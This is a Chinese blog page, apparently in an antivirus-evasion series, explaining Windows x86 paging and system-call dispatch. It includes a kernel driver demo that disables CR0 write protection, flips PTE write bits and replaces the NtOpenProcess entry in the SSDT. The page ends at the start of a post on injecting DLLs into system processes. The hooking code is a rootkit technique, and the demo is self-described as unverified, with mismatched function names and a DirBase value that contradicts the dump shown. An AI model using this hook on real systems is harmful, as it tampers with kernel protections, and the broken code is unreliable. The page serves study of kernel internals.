<h2 id="Cr3寄存器"><a href="#Cr3寄存器" class="headerlink" title="Cr3寄存器"></a>Cr3寄存器</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CR3是一个控制寄存器，该寄存器内保存有页目录表物理地址，其实CR3内部存放的就是页目录表的内</span><br><span class="line">存基地址，运用CR3切换可实现对特定进程内存地址的强制读写操作</span><br></pre></td></tr></table></figure>

<p>Cr3寄存器不同于其他寄存器，在所有的寄存器中，只有Cr3寄存器存储的地址是物理地址，其他寄存器 存储的都是线性地址</p>
<p>Cr3寄存器所存储的物理地址指向了一个页目录表（Page-Directory Table，PDT），<strong>在Windows中，一个页的大小通常位4KB，即一个页（页目录表）可以存储1024个页目录表项（PDE）</strong></p>
<p>同样，第二级为页表（PTT），每个页表的大小为4kb，即一个页表可以存储1024个页表项（PTE）</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240929201012439.png" alt="image-20240929201012439"></p>
<h3 id="PDE-PTE"><a href="#PDE-PTE" class="headerlink" title="PDE&amp;PTE"></a>PDE&amp;PTE</h3><p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240929201906035.png" alt="image-20240929201906035"></p>
<p>通过上面这张图我们可以看见，在PDE或者PTE中，只有0位置为1，那么整个表才有效，1位，2位分别是读写位和特权位，分别表示属性可读可写和是否是特权用户</p>
<h2 id="查看PDE和PTE"><a href="#查看PDE和PTE" class="headerlink" title="查看PDE和PTE"></a>查看PDE和PTE</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process <span class="number">0</span> <span class="number">0</span></span><br><span class="line">**** NT ACTIVE PROCESS DUMP ****</span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS <span class="number">821b</span>9830  SessionId: none  Cid: <span class="number">0004</span>    Peb: <span class="number">00000000</span>  ParentCid: <span class="number">0000</span></span><br><span class="line">    DirBase: <span class="number">00</span>aff000  ObjectTable: e1000cf8  HandleCount: <span class="number">243.</span></span><br><span class="line">    Image: System</span><br><span class="line"></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS <span class="number">82063360</span>  SessionId: none  Cid: <span class="number">0170</span>    Peb: <span class="number">7f</span>fd6000  ParentCid: <span class="number">0004</span></span><br><span class="line">    DirBase: <span class="number">08f</span>c0020  ObjectTable: e13e1510  HandleCount:  <span class="number">19.</span></span><br><span class="line">    Image: smss.exe</span><br></pre></td></tr></table></figure>

<p>这里我们看见了DirBase是09580020，开个用户层看看，这里PTE属性最后是5，也就是二进制的0101，R&#x2F;W位为0，则属性为可读</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !vtop <span class="number">08f</span>c0020 <span class="number">0x7ffe0000</span></span><br><span class="line">X86VtoP: Virt <span class="number">000000007f</span>fe0000, pagedir <span class="number">0000000008f</span>c0020</span><br><span class="line">X86VtoP: PAE PDPE <span class="number">0000000008f</span>c0028 - <span class="number">0000000008</span>d2f001</span><br><span class="line">X86VtoP: PAE PDE <span class="number">0000000008</span>d2fff8 - <span class="number">0000000008</span>cfa067</span><br><span class="line">X86VtoP: PAE PTE <span class="number">0000000008</span>cfaf00 - <span class="number">8000000000041025</span></span><br><span class="line">X86VtoP: PAE Mapped phys <span class="number">0000000000041000</span></span><br><span class="line">Virtual address <span class="number">7f</span>fe0000 translates to physical address <span class="number">41000.</span></span><br></pre></td></tr></table></figure>

<p>然后再开一个内核层的看看，PTE的最后的属性是3，即为0011，R&#x2F;W位为1，可读可写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !vtop <span class="number">08f</span>c0020 <span class="number">0xffdf0000</span></span><br><span class="line">X86VtoP: Virt <span class="number">00000000f</span>fdf0000, pagedir <span class="number">0000000008f</span>c0020</span><br><span class="line">X86VtoP: PAE PDPE <span class="number">0000000008f</span>c0038 - <span class="number">0000000008</span>d2d001</span><br><span class="line">X86VtoP: PAE PDE <span class="number">0000000008</span>d2dff0 - <span class="number">0000000000b</span>10163</span><br><span class="line">X86VtoP: PAE PTE <span class="number">0000000000b</span>10f80 - <span class="number">0000000000041163</span></span><br><span class="line">X86VtoP: PAE Mapped phys <span class="number">0000000000041000</span></span><br><span class="line">Virtual address ffdf0000 translates to physical address <span class="number">41000.</span></span><br></pre></td></tr></table></figure>

<h2 id="调用原理"><a href="#调用原理" class="headerlink" title="调用原理"></a>调用原理</h2><p>   在我们了解了KUSER_SHARED_DATA结构体后，就可以知道call的实际上是 Systemcall 的地址，通过反 汇编查看，通过 sysenter 指令（快速调用）进入0环。操作系统会在系统启动的时候在 KUSER_SHARED_DATA 结构体的+300的位置，写入一个函数，这个函数就是 KiFastSystemCall 或者 KiIntSystemCall,我们可以看见SystemCall</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KUSER_SHARED_DATA <span class="number">0xffdf0000</span></span><br><span class="line">nt!_KUSER_SHARED_DATA</span><br><span class="line">   +<span class="number">0x000</span> TickCountLow     : <span class="number">0x10859</span></span><br><span class="line">   +<span class="number">0x004</span> TickCountMultiplier : <span class="number">0xfa00000</span></span><br><span class="line">..............................................</span><br><span class="line">   +<span class="number">0x300</span> SystemCall       : <span class="number">0x7c92e4f0</span></span><br><span class="line">   +<span class="number">0x304</span> SystemCallReturn : <span class="number">0x7c92e4f4</span></span><br><span class="line">   +<span class="number">0x308</span> SystemCallPad    : [<span class="number">3</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x320</span> TickCount        : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x320</span> TickCountQuad    : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x330</span> Cookie           : <span class="number">0xbd8441e5</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以看见这个SystemCall的地址是0x7c92e4f0</p>
<p><strong>Windows中三环进零环需要我们有换栈，换寄存器这些操作</strong></p>
<p>在进入0环之前，需要我们更改CS,SS,ESP,EIP四个寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CS的权限由3变为0 意味着需要新的CS</span><br><span class="line">SS与CS的权限永远一致 需要新的SS</span><br><span class="line">权限发生切换的时候，堆栈也一定会切换，需要新的ESP</span><br><span class="line">进0环后代码的位置，需要EIP</span><br></pre></td></tr></table></figure>

<p>如果通过中断门（int 2e）进0环，需要的CS、EIP在IDT表中，需要查内存(SS与 ESP由TSS提供) </p>
<p>而CPU如果支持sysenter指令时，操作系统会提前将CS&#x2F;SS&#x2F;ESP&#x2F;EIP的值存储在MSR寄存器中，sysenter 指令执行时，<strong>CPU会将MSR寄存器中的值直接写入相关寄存器，没有读内存的过程，</strong>所以叫快速调用 </p>
<p> API通过中断门进0环： 固定中断号为0x2E CS&#x2F;EIP由门描述符提供 ESP&#x2F;SS由TSS提供 进入0环后执行的内核函数：NT!KiSystemService</p>
<p> API通过sysenter指令进0环： CS&#x2F;ESP&#x2F;EIP由MSR寄存器提供(SS是算出来的) 进入0环后执行的内核函数：NT!KiFastCallEntry</p>
<h2 id="SSDT-hook"><a href="#SSDT-hook" class="headerlink" title="SSDT hook"></a>SSDT hook</h2><p>上面我们提到过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">KSYSTEM_SERVICE_TABLE ntoskrnl; <span class="comment">// ntoskrnl.exe 的服务函数</span></span><br><span class="line">KSYSTEM_SERVICE_TABLE win32k; <span class="comment">// win32k.sys 的服务函数(GDI32.dll/User32.dll 的</span></span><br><span class="line">内核支持)</span><br><span class="line">KSYSTEM_SERVICE_TABLE notUsed1;</span><br><span class="line">KSYSTEM_SERVICE_TABLE notUsed2;</span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, * PKSERVICE_TABLE_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p>对于其中的每一项，又是一个结构体，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">PULONG ServiceTableBase; <span class="comment">// SSDT (System Service Dispatch Table)的基地址</span></span><br><span class="line">PULONG ServiceCounterTableBase; <span class="comment">// 用于 checked builds, 包含 SSDT 中每个</span></span><br><span class="line">服务被调用的次数</span><br><span class="line">ULONG NumberOfService; <span class="comment">// 服务函数的个数, NumberOfService * 4 就是整个地址表的</span></span><br><span class="line">大小</span><br><span class="line">ULONG ParamTableBase; <span class="comment">// SSPT(System Service Parameter Table)的基地址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, * PKSYSTEM_SERVICE_TABLE;</span><br></pre></td></tr></table></figure>

<h3 id="Cr4寄存器"><a href="#Cr4寄存器" class="headerlink" title="Cr4寄存器"></a>Cr4寄存器</h3><p>在我们的函数准备好之后，需要我们将该函数的指针覆盖原来的NtOpenProcess指针</p>
<p>我们知道物理页的内存的R&#x2F;W位的属性是由PDE和PTE相与来的，那么我们就可以，通过改变SSDT对应的PDE和PTE的属性，将其设置成为可读可写的</p>
<p>这里首先我们用<strong>Cr4寄存器判断是2-9-9-12分页还是10-10-12分页</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if(RCR4 &amp; 0x00000020)</span><br><span class="line">&#123;//说明是2-9-9-12分页</span><br><span class="line">KdPrint((&quot;2-9-9-12分页 %p\n&quot;,RCR4));</span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9)</span><br><span class="line">&amp;0x007FFFF8))));</span><br><span class="line">*(DWORD64*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp; 0x007FFFF8)) |= 0x02;</span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9)</span><br><span class="line">&amp;0x007FFFF8))));</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;//说明是10-10-12分页</span><br><span class="line">KdPrint((&quot;10-10-12分页\n&quot;));</span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp;</span><br><span class="line">0x003FFFFC))));</span><br><span class="line">*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC)) |= 0x02;</span><br><span class="line">KdPrint((&quot;PTE2 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10)</span><br><span class="line">&amp;0x003FFFFC))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Cr0寄存器"><a href="#Cr0寄存器" class="headerlink" title="Cr0寄存器"></a>Cr0寄存器</h3><p>我们可以使用PsGetCurrentThread函数来获取当前KTHREAD的首地址，但是SSDT表所在的内存页的属性是只读，没有写入的权限，所以需要吧地址设置为可写入，这里使用Cr0来关闭寄存器的只读属性</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930093833367.png" alt="image-20240930093833367"></p>
<p>在这个寄存器中，重点关注三个标志位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PE 是否启用保护模式，置1则启用。</span><br><span class="line">PG 是否使用分页模式，置1则开启分页模式, 此标志置1时，PE 标志也必须置1，否则CPU报异常。</span><br><span class="line">WP WP为1时，不能修改只读的内存页，WP为0时，可以修改只读的内存页。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在进行Hook时，只要把CR0寄存器中的WP位设置为0，就能对内存进行写入操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关闭页只读保护</span></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">push eax;</span><br><span class="line">mov eax, cr0;</span><br><span class="line">and eax, ~<span class="number">0x10000</span>; <span class="comment">// 与0x10000相与后取反</span></span><br><span class="line">mov cr0, eax;</span><br><span class="line">pop eax;</span><br><span class="line">ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//开启页只读保护</span></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">push eax;</span><br><span class="line">mov eax, cr0;</span><br><span class="line">or eax, <span class="number">0x10000</span>;</span><br><span class="line">mov cr0, eax;</span><br><span class="line">pop eax;</span><br><span class="line">ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="demo（x86未验证）"><a href="#demo（x86未验证）" class="headerlink" title="demo（x86未验证）"></a>demo（x86未验证）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//记录函数的地址</span></span><br><span class="line">ULONG uOldNtOpenProcess;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内核之SSDT-HOOK</span></span><br><span class="line"><span class="comment">//系统服务表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span> &#123;</span></span><br><span class="line">	PULONG ServiceTableBase;  <span class="comment">//函数地址表中的首地址</span></span><br><span class="line">	PULONG ServiceCounterTableBase; <span class="comment">//函数表中每个函数被调用的次数</span></span><br><span class="line">	ULONG NumberOfService;    <span class="comment">//服务函数的个数</span></span><br><span class="line">	ULONG ParamTableBsse;     <span class="comment">//参数个数表的首地址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE,* PSSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_TABLE_DESCRIPTOR</span> &#123;</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE ntoskrnl;<span class="comment">//ntoskrnl.exe的服务函数，SSDT</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE win32k;<span class="comment">//win32k.sys的服务函数，ShadowSSDT</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE notUsed1; <span class="comment">//</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE notUsed2;</span><br><span class="line">&#125;KSERCIVCE_TABLE_DESCRIPTOR, * PKSERCIVCE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义HOOK函数的类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* FuZwOpenProcess)</span><span class="params">(</span></span><br><span class="line"><span class="params">	_Out_ PHANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	_In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	_In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">	_In_opt_ PCLIENT_ID ClientId</span></span><br><span class="line"><span class="params">	)</span>;</span><br><span class="line"><span class="comment">//自写的函数声明</span></span><br><span class="line">NTSTATUS NTAPI <span class="title function_">MyZwOpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">	_Out_ PHANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	_In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	_In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">	_In_opt_ PCLIENT_ID ClientId</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里KeSerciveDescriptorTable 为ntoskrnl.exe所导出的全局变量</span></span><br><span class="line"><span class="keyword">extern</span> PKSERCIVCE_TABLE_DESCRIPTOR KeServiceDescriptorTable;</span><br><span class="line"></span><br><span class="line"><span class="comment">//记录系统的该函数</span></span><br><span class="line">FuZwOpenProcess g_OldZwOpenProcess;</span><br><span class="line"><span class="comment">//服务描述符表指针</span></span><br><span class="line">KSERCIVCE_TABLE_DESCRIPTOR* g_pSercivceTable = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//要保护的进程ID</span></span><br><span class="line">ULONG g_Pid = <span class="number">1624</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装钩子</span></span><br><span class="line">NTSTATUS <span class="title function_">HookNtOpenProcess</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载钩子</span></span><br><span class="line">NTSTATUS <span class="title function_">UnHookOpenProcess</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭页写入保护</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ShutPageProtect</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//开启页写入保护</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">OpenPageProtect</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载驱动</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DricerUnload</span><span class="params">(DRIVER_OBJECT* obj)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//驱动入口主函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(DRIVER_OBJECT* driver, UNICODE_STRING* path)</span> &#123;</span><br><span class="line"></span><br><span class="line">	KdPrint((<span class="string">&quot;驱动启动成功！\n&quot;</span>));</span><br><span class="line">		<span class="comment">//安装钩子</span></span><br><span class="line">	HookNtOpenProcess();</span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载驱动</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DriverUnload</span><span class="params">(DRIVER_OBJECT* obj)</span> &#123;</span><br><span class="line">	<span class="comment">//卸载钩子</span></span><br><span class="line">	UnHookOpenProcess();</span><br><span class="line">	KdPrint((<span class="string">&quot;驱动卸载成功！\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">HookNtOpenProcess</span><span class="params">()</span> &#123;</span><br><span class="line">	NTSTATUS Status;</span><br><span class="line"></span><br><span class="line">	Status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1.关闭页只读保护</span></span><br><span class="line">	ShutPageProtect();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.写入原来的函数到SSDT表内</span></span><br><span class="line">	uOldNtOpenProcess = KeServiceDescriptorTable -&gt; ntoskrnl.ServiceTableBase[<span class="number">0x7a</span>];</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0x7a</span>] =(ULONG)MyZwOpenProcess;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3.开启页只读保护</span></span><br><span class="line">	OpenPageProtect();</span><br><span class="line">	<span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载钩子</span></span><br><span class="line">NTSTATUS <span class="title function_">UnHookNtOpenProcess</span><span class="params">()</span> &#123;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	status = STATUS_SUCCESS;</span><br><span class="line">	<span class="comment">//1.关闭页保护</span></span><br><span class="line">	ShutPageProtect();</span><br><span class="line">	<span class="comment">//2.写入原来的函数进入SSDT表内</span></span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0x7a</span>] = uOldNtOpenProcess;</span><br><span class="line">	<span class="comment">//3.开启页只读保护</span></span><br><span class="line">	OpenPageProtect();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭页只读保护</span></span><br><span class="line"><span class="type">void</span> _declspec(naked) ShutPageProtect()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push eax;</span><br><span class="line">		mov eax, cr0;</span><br><span class="line">		and eax, ~<span class="number">0x10000</span>;</span><br><span class="line">		mov cr0, eax;</span><br><span class="line">		pop eax;</span><br><span class="line">		ret;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//开启页只读保护</span></span><br><span class="line"><span class="type">void</span> _declspec(naked) OpenPageProtect()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push eax;</span><br><span class="line">		mov eax, cr0;</span><br><span class="line">		or eax, <span class="number">0x10000</span>;</span><br><span class="line">		mov cr0, eax;</span><br><span class="line">		pop eax;</span><br><span class="line">		ret;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Hook 函数</span></span><br><span class="line">NTSTATUS NTAPI <span class="title function_">MyZwOpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">	_Out_ PHANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	_In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	_In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">	_In_opt_ PCLIENT_ID ClientId</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//当此进程为要保护的进程时</span></span><br><span class="line">	<span class="keyword">if</span> (ClientId-&gt;UniqueProcess == (HANDLE)g_Pid) &#123;</span><br><span class="line">		<span class="comment">//设置为拒绝访问</span></span><br><span class="line">		DesiredAccess = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/SSDT%20Hook/" data-id="cm1zwlrfm0008u0v6dqxk8p94" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/Session注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/Session%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.558Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Session注入"><a href="#Session注入" class="headerlink" title="Session注入"></a>Session注入</h1><p>在进行Dll注入的时候，我们发现没法注入一些系统进程</p>
<p>提示我们缺少权限或者拒绝访问，甚至干脆就是什么反应都没有</p>
<p>这时候我们考虑往更加底层去跟函数，我们不能再使用在用户层所给我们的函数，我们自己去寻找内核层的函数</p>
